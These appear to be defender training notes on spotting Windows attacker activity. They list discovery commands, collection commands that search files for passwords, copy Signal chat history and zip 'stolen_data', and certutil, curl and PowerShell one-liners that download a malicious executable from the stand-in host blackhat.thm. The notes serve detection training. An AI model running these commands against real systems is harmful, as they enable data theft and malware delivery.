# Discovery Overview - CMD/Powershell Discovery Commands

1) **Files and Folders (To find out the host purpose, victim's job, or their interests)**: 
    - `type <file>`
    - `Get-Content <file>`
    - `dir <folder>`
    - `Get-ChildItem <folder>`
2) **Users and Groups (To find out who uses the host and with which privileges)**:
    - `whoami`
    - `net user`
    - `net localgroup`
    - `query user`
    - `Get-LocalUser`
3) **System and Apps (To find out vulnerabilities or apps to steal data from)**:
    - `tasklist /v`
    - `systeminfo`
    - `wmic product get name,version`
    - `Get-Service`
4) **Network Settings (To find out if the host belongs to a corporate network)**: 
    - `ipconfig /all`
    - `netstat -ano`
    - `netsh advfirewall show allprofiles`
5) **Active Antivirus (To find out how risky it is to continue the attack without being blocked)**:
    - `Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct"`

## Detecting Collection - CMD/Powershell Collection Commands

1) **`notepad.exe C:\Users\<user>\Desktop\finances-2025.csv`**: Threat actors used Notepad to check content of the interesting file
2) **`type debug-logs.txt | findstr password > C:\Temp\passwords.txt`**: Threat actors searched for the "password" keyword in a specific file
3) **`Get-ChildItem C:\Users\<user> -Recurse -Filter *.pdf`**: Threat actors searched for PDF files in the user's home folder
4) **`copy C:\Users\<user>\AppData\Roaming\Signal С:\Temp\`**: Threat actors copied Signal chat history to the Temp directory
5) **`Compress-Archive С:\Temp\ С:\Temp\stolen_data.zip`**: Threat actors archived the stolen data, preparing for exfiltration
6) **`7za.exe a -tzip C:\Temp\stolen_data.zip С:\\Temp\\*.*`**: Alternatively, threat actors can use the existing archiving software like 7-Zip

# Ingress Tool Transfer

At some attack stages, threat actors may need to download more tools to achieve their goals, for example:

- A script to automate Discovery and find common vulnerabilities like Seatbelt
- A tool to extract saved passwords or OS credentials like Mimikatz
- A fully functional Remote Access Trojan (RAT) like Remcos RAT
- Finally, a ransomware binary to encrypt the system after the data is stolen
The process of downloading additional malware to the breached system is mapped to the MITRE Ingress Tool Transfer technique, and it is used in the majority of breaches.

## Common Transfer Methods

1) **Via certutil**: `certutil.exe -urlcache -f https://blackhat.thm/bad.exe good.exe`
2) **Via Curl (Windows 10+)**: `curl.exe https://blackhat.thm/bad.exe -o good.exe`
3) **Via Powershell IWR**: `powershell -c "Invoke-WebRequest -Uri 'https://blackhat.thm/bad.exe' -OutFile 'good.exe'"`
4) **Via Graphical Interface**: No need to use CMD, just copy-paste malware via RDP or download them via a web browser!

## Detecting Tool Transfer

Since a transfer requires a network connection, your best option would be to track a network connection or a DNS request from the suspicious process. Note, however, that threat actors often try to avoid detection by downloading the tools from legitimate services like GitHub, so make sure to analyze which process is making the connection, the destination domain, and the file being downloaded.

